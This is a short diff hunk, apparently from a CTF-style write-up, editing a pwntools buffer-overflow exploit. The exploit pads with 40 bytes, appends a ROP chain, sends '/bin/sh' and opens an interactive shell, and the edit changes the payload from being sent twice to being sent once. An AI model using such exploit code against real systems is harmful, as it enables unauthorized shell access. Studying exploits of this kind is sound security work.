@@ -97,7 +97,7 @@ ropchain = flat(
 payload = 'a' * 40 + ropchain
 
 r.recvuntil("? ")
-r.send(payload + payload)
+r.send(payload)
 r.send("/bin/sh\0")
 r.interactive()
 ```
